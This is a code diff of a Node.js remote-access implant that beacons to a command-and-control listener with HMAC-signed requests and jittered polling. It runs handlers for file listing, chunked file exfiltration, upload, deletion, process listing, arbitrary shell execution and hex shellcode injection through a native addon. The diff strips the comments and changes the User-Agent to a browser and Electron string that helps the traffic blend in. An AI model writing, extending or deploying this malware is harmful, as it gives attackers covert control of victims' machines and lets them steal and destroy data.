@@ -18,7 +18,7 @@ const LISTENER_ENDPOINT = process.env.ANOMALY_ENDPOINT || '/wiki';
 const HMAC_KEY = process.env.ANOMALY_HMAC_KEY || '76b7142fb03436325c744a35bd1302d0e35ec7e04c1857bdeed0549f051b99fb';
 const RECONNECT_INTERVAL = parseInt(process.env.ANOMALY_INTERVAL || '15', 10);
 const JITTER_SECONDS = parseInt(process.env.ANOMALY_JITTER || '10', 10);
-const USER_AGENT = process.env.ANOMALY_USER_AGENT || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+const USER_AGENT = process.env.ANOMALY_USER_AGENT || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Electron/28.0.0 Safari/537.36';
 
 // Constants
 const CHUNK_SIZE = 2 * 1024 * 1024; // 2MB
@@ -32,7 +32,6 @@ const state = {
     currentCommandId: 0
 };
 
-// Generate UUID v4
 function generateUUID() {
     return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
         const r = (Math.random() * 16) | 0;
@@ -41,14 +40,12 @@ function generateUUID() {
     });
 }
 
-// HMAC generation
 function generateHMAC(message, key) {
     const hmac = crypto.createHmac('sha256', key);
     hmac.update(message);
     return hmac.digest('hex');
 }
 
-// Sign request
 function signRequest(method, path, body) {
     const timestamp = Math.floor(Date.now() / 1000).toString();
     const message = `${method}${path}${timestamp}${body}`;
@@ -56,7 +53,6 @@ function signRequest(method, path, body) {
     return { timestamp, signature };
 }
 
-// Wrap data with HMAC
 function wrapWithHMAC(data) {
     const jsonData = JSON.stringify(data);
     const { timestamp, signature } = signRequest('POST', LISTENER_ENDPOINT, jsonData);
@@ -67,7 +63,6 @@ function wrapWithHMAC(data) {
     });
 }
 
-// Send HTTPS request
 function sendHTTPSRequest(endpoint, data, headers = {}) {
     return new Promise((resolve, reject) => {
         const options = {
@@ -101,14 +96,12 @@ function sendHTTPSRequest(endpoint, data, headers = {}) {
     });
 }
 
-// Send signed request
 async function sendSignedRequest(data, customHeaders = {}) {
     const wrappedData = wrapWithHMAC(data);
     const headers = { 'Content-Type': 'application/json', ...customHeaders };
     return await sendHTTPSRequest(LISTENER_ENDPOINT, wrappedData, headers);
 }
 
-// Parse HTTPS response
 function parseHTTPSResponse(respData) {
     if (respData.status !== 200) {
         throw new Error(`Request failed with status ${respData.status}`);
@@ -121,7 +114,6 @@ function parseHTTPSResponse(respData) {
     }
 }
 
-// Get local IP address
 function getLocalIP() {
     const interfaces = os.networkInterfaces();
     for (const name of Object.keys(interfaces)) {
@@ -134,7 +126,6 @@ function getLocalIP() {
     return 'unknown';
 }
 
-// Register agent
 async function registerAgent() {
     const registration = {
         uuid: state.agentId,
@@ -148,7 +139,6 @@ async function registerAgent() {
     parseHTTPSResponse(resp);
 }
 
-// Get pending commands
 async function getPendingCommands() {
     const pollRequest = { agentId: state.agentId };
     const resp = await sendSignedRequest(pollRequest);
@@ -156,7 +146,6 @@ async function getPendingCommands() {
     return result.commands || [];
 }
 
-// Send command response
 async function sendCommandResponse(commandId, output, status) {
     const response = {
         commandId,
@@ -172,7 +161,6 @@ async function sendCommandResponse(commandId, output, status) {
     await sendSignedRequest(response, headers);
 }
 
-// Format file size
 function formatFileSize(size) {
     if (size === 0) return '0B';
     const units = ['B', 'KB', 'MB', 'GB', 'TB'];
@@ -180,7 +168,6 @@ function formatFileSize(size) {
     return `${(size / Math.pow(1024, i)).toFixed(1)}${units[i]}`;
 }
 
-// Handle ls command
 async function handleLs(args) {
     const targetPath = args[0] || '.';
     const absPath = path.resolve(targetPath);
@@ -294,7 +281,6 @@ async function handleGetChunkedFile(filePath) {
     return `got ${filename}! (${fileSize} bytes in ${totalChunks} chunks, md5=${expectedMd5})`;
 }
 
-// Handle get command
 async function handleGet(args) {
     if (args.length === 0) {
         throw new Error('usage: get <filepath>');
@@ -310,7 +296,6 @@ async function handleGet(args) {
     }
 }
 
-// Handle put command
 async function handlePut(args) {
     if (args.length < 2) {
         throw new Error('usage: put <filepath> <hex_data>');
@@ -327,7 +312,6 @@ async function handlePut(args) {
     return `File uploaded successfully: ${filePath} (${fileData.length} bytes)`;
 }
 
-// Handle cd command
 async function handleCd(args) {
     if (args.length === 0) {
         return process.cwd();
@@ -337,13 +321,11 @@ async function handleCd(args) {
     return `Changed directory to: ${process.cwd()}`;
 }
 
-// Handle kill command
 async function handleKill(args) {
     setTimeout(() => process.exit(0), 1000);
     return 'Agent terminating...';
 }
 
-// Handle ps command
 async function handlePs(args) {
     if (os.platform() === 'win32') {
         const { stdout } = await execAsync('tasklist /FO CSV /NH');
@@ -354,7 +336,6 @@ async function handlePs(args) {
     }
 }
 
-// Handle exec command
 async function handleExec(args) {
     if (args.length === 0) {
         throw new Error('usage: exec <command>');
@@ -365,7 +346,6 @@ async function handleExec(args) {
     return stdout + stderr;
 }
 
-// Handle reconnect command
 async function handleReconnect(args) {
     if (args.length === 0) {
         return `Current reconnect interval: ${state.reconnectInterval} seconds\nUsage: reconnect <seconds>`;
@@ -381,7 +361,6 @@ async function handleReconnect(args) {
     return `Reconnect interval changed from ${oldInterval} to ${newInterval} seconds`;
 }
 
-// Handle rm command
 async function handleRm(args) {
     if (args.length === 0) {
         throw new Error('usage: rm <filepath>');
@@ -398,7 +377,6 @@ async function handleRm(args) {
     return `Removed file: ${filePath}`;
 }
 
-// Handle rmdir command
 async function handleRmdir(args) {
     if (args.length === 0) {
         throw new Error('usage: rmdir <dirpath>');
@@ -415,7 +393,6 @@ async function handleRmdir(args) {
     return `Removed directory: ${dirPath}`;
 }
 
-// Handle jitter command
 async function handleJitter(args) {
     if (args.length === 0) {
         return `Current jitter: +/- ${state.jitterSeconds} seconds\nUsage: jitter <seconds>`;
@@ -431,7 +408,6 @@ async function handleJitter(args) {
     return `Jitter changed from +/- ${oldJitter} to +/- ${newJitter} seconds`;
 }
 
-// Handle injectsc command
 async function handleInjectSc(args) {
     if (args.length === 0) {
         throw new Error('usage: injectsc <hex_shellcode>');
@@ -443,25 +419,19 @@ async function handleInjectSc(args) {
     }
 
     try {
-        // Load native addon
         const inject = require('./build/Release/inject.node');
-
-        // Get shellcode from arguments
         const hexShellcode = args.join('').replace(/\s/g, '');
 
-        // Validate hex
         if (hexShellcode.length % 2 !== 0) {
             throw new Error('Invalid hex shellcode: odd length');
         }
 
-        // Convert hex to buffer
         const shellcode = Buffer.from(hexShellcode, 'hex');
 
         if (shellcode.length === 0) {
             throw new Error('Empty shellcode provided');
         }
 
-        // Execute shellcode via native addon
         inject.executeShellcode(shellcode);
 
         return `Shellcode executed (${shellcode.length} bytes)`;
@@ -470,7 +440,6 @@ async function handleInjectSc(args) {
     }
 }
 
-// Parse command arguments respecting quotes
 function parseCommandArgs(command) {
     const parts = [];
     let current = '';
@@ -481,26 +450,21 @@ function parseCommandArgs(command) {
         const char = command[i];
         
         if ((char === '"' || char === "'") && !inQuotes) {
-            // Start of quoted string
             inQuotes = true;
             quoteChar = char;
         } else if (char === quoteChar && inQuotes) {
-            // End of quoted string
             inQuotes = false;
             quoteChar = '';
         } else if (char === ' ' && !inQuotes) {
-            // Space outside quotes - delimiter
             if (current.length > 0) {
                 parts.push(current);
                 current = '';
             }
         } else {
-            // Regular character
             current += char;
         }
     }
     
-    // Add last part
     if (current.length > 0) {
         parts.push(current);
     }
@@ -508,7 +472,6 @@ function parseCommandArgs(command) {
     return parts;
 }
 
-// Execute command
 async function executeCommand(command) {
     const parts = parseCommandArgs(command.trim());
     if (parts.length === 0) {
@@ -532,13 +495,11 @@ async function executeCommand(command) {
         case 'jitter': return await handleJitter(args);
         case 'injectsc': return await handleInjectSc(args);
         default:
-            // Try to execute as system command
             const { stdout, stderr } = await execAsync(command);
             return stdout + stderr;
     }
 }
 
-// Calculate interval with jitter
 function calculateIntervalWithJitter() {
     if (state.jitterSeconds === 0) {
         return state.reconnectInterval;
@@ -549,7 +510,6 @@ function calculateIntervalWithJitter() {
     return Math.max(1, interval);
 }
 
-// Command polling loop
 async function commandLoop() {
     while (true) {
         const interval = calculateIntervalWithJitter();
@@ -578,15 +538,12 @@ async function commandLoop() {
     }
 }
 
-// Main function
 async function main() {
-    // Initial jitter
     if (state.jitterSeconds > 0) {
         const initialJitter = Math.floor(Math.random() * (state.jitterSeconds + 1));
         await new Promise(resolve => setTimeout(resolve, initialJitter * 1000));
     }
 
-    // Registration loop
     while (true) {
         try {
             await registerAgent();
@@ -596,7 +553,6 @@ async function main() {
         }
     }
 
-    // Start command polling
     await commandLoop();
 }
 
@@ -609,7 +565,4 @@ process.on('unhandledRejection', (err) => {
     // Silently ignore to avoid crashes
 });
 
-// Start the agent
 main().catch(() => process.exit(1));
-
-
